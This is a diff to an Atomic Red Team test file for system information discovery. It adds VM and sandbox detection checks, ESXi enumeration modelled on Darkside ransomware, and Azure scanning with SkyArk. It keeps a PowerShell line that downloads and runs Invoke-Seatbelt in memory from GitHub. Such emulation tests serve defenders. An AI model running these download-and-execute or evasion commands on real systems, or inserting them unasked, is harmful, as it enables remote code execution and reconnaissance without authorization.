@@ -41,6 +41,7 @@ atomic_tests:
       if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi
       if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   
       if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi
+      if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi
       uptime >> #{output_file}
       cat #{output_file} 2>/dev/null
     cleanup_command: |
@@ -53,6 +54,7 @@ atomic_tests:
   supported_platforms:
   - linux
   executor:
+    elevation_required: true
     command: |
       if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
       if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
@@ -77,6 +79,17 @@ atomic_tests:
       sudo lsmod | grep -i "virtio_pci\|virtio_net"
       sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
     name: bash
+- name: FreeBSD VM Check via Kernel Modules
+  auto_generated_guid: eefe6a49-d88b-41d8-8fc2-b46822da90d3
+  description: |
+    Identify virtual machine host kernel modules.
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      kldstat | grep -i "vmm"
+      kldstat | grep -i "vbox"
+    name: sh
 - name: Hostname Discovery (Windows)
   auto_generated_guid: 85cfbf23-4a1e-4342-8792-007e004b975f
   description: |
@@ -90,14 +103,14 @@ atomic_tests:
 - name: Hostname Discovery
   auto_generated_guid: 486e88ea-4f56-470f-9b57-3f4d73f39133
   description: |
-    Identify system hostname for Linux and macOS systems.
+    Identify system hostname for FreeBSD, Linux and macOS systems.
   supported_platforms:
   - linux
   - macos
   executor:
     command: |
       hostname
-    name: bash
+    name: sh
 - name: Windows MachineGUID Discovery
   auto_generated_guid: 224b4daf-db44-404e-b6b2-f4d1f0126ef8
   description: |
@@ -126,12 +139,13 @@ atomic_tests:
   - description: |
       Sample script file must exist on disk at specified location (#{vbscript})
     prereq_command: |
-      if (Test-Path #{vbscript}) {exit 0} else {exit 1}
+      if (Test-Path "#{vbscript}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{vbscript}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{vbscript}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
   executor:
-    command: 'cscript #{vbscript}'
+    command: |
+      cscript "#{vbscript}"
     name: powershell
     elevation_required: false
 - name: Environment variables discovery on windows
@@ -144,13 +158,13 @@ atomic_tests:
     command: |
       set
     name: command_prompt
-- name: Environment variables discovery on macos and linux
+- name: Environment variables discovery on freebsd, macos and linux
   auto_generated_guid: fcbdd43f-f4ad-42d5-98f3-0218097e2720
   description: |
     Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
   supported_platforms:
-  - macos
   - linux
+  - macos
   executor:
     command: |
       env
@@ -281,7 +295,7 @@ atomic_tests:
   executor:
     command: |-
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
-      Invoke-Seatbelt -Command "-group=all"; pause
+      Invoke-Seatbelt -Command "-group=all"
     name: powershell
 - name: Azure Security Scan with SkyArk
   auto_generated_guid: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
@@ -303,11 +317,12 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      The SkyArk AzureStealth module must exist in $env:temp.
+      The SkyArk AzureStealth module must exist in PathToAtomicsFolder\..\ExternalPayloads.
     prereq_command: |
-      if (test-path $env:temp\AzureStealth.ps1){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"){exit 0} else {exit 1}
     get_prereq_command: |
-      invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "$env:temp\AzureStealth.ps1"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"
   - description: |
       The AzureAD module must be installed.
     prereq_command: |
@@ -322,7 +337,7 @@ atomic_tests:
       Install-Module -Name Az -Force
   executor:
     command: |
-      Import-Module $env:temp\AzureStealth.ps1 -force      
+      Import-Module "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1" -force      
       $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
       $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
       Connect-AzAccount -Credential $Credential
@@ -346,6 +361,18 @@ atomic_tests:
       kmod list
       grep vmw /proc/modules
     name: sh
+- name: FreeBSD List Kernel Modules
+  auto_generated_guid: 4947897f-643a-4b75-b3f5-bed6885749f6
+  description: |
+    Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      kldstat
+      kldstat | grep vmm
+    name: sh
+
 - name: System Information Discovery with WMIC
   auto_generated_guid: 8851b73a-3624-4bf7-8704-aa312411565c
   description: |
@@ -368,4 +395,135 @@ atomic_tests:
       wmic path win32_VideoController get VideoModeDescription
       wmic OS get Caption,OSArchitecture,Version
       wmic DISKDRIVE get Caption
+      Get-WmiObject win32_bios
     name: command_prompt
+
+- name: System Information Discovery
+  auto_generated_guid: 4060ee98-01ae-4c8e-8aad-af8300519cc7
+  description: |
+    The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\Windows\System32\config or c:\Windows\System32\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
+    elevation_required: true
+    name: command_prompt
+- name: Check computer location
+  auto_generated_guid: 96be6002-9200-47db-94cb-c3e27de1cb36
+  description: |
+    Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.
+    - https://tria.ge/210111-eaz8mqhgh6/behavioral1
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
+    name: command_prompt
+- name: BIOS Information Discovery through Registry 
+  auto_generated_guid: f2f91612-d904-49d7-87c2-6c165d23bead
+  description: |
+    Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.
+    - https://tria.ge/210111-eaz8mqhgh6/behavioral1
+    - https://evasions.checkpoint.com/techniques/registry.html
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
+      reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
+    name: command_prompt
+- name: ESXi - VM Discovery using ESXCLI
+  auto_generated_guid: 2040405c-eea6-4c1c-aef3-c2acc430fac9
+  description: |
+    An adversary will using ESXCLI to enumerate the Virtual Machines on the host prior to executing power off routine.
+    [Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)
+  supported_platforms:
+  - linux
+  input_arguments:
+    vm_host:
+      description: Specify the host name or IP of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to Plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to file with discovery commands
+      type: path
+      default: PathToAtomicsFolder\T1082\src\esx_vmdiscovery.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+    elevation_required: false
+- name: ESXi - Darkside system information discovery
+  auto_generated_guid: f89812e5-67d1-4f49-86fa-cbc6609ea86a
+  description: |
+    Darkside ransomware utilises various ESXCLI commands to obtain information about the ESXi Host.
+    [Reference](https://www.trendmicro.com/en_ph/research/21/e/darkside-linux-vms-targeted.html)
+  supported_platforms:
+  - linux
+  input_arguments:
+    vm_host:
+      description: Specify the host name or IP of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to Plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to file containing darkside ransomware discovery commands
+      type: path
+      default: PathToAtomicsFolder\T1082\src\esx_darkside_discovery.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+    elevation_required: false
+- name: sysctl to gather macOS hardware info
+  auto_generated_guid: c8d40da9-31bd-47da-a497-11ea55d1ef6c
+  description: Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine. sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.
+  supported_platforms:
+  - macos
+  executor:
+    command: sysctl -n hw.model
+    name: sh
+    elevation_required: false
+  
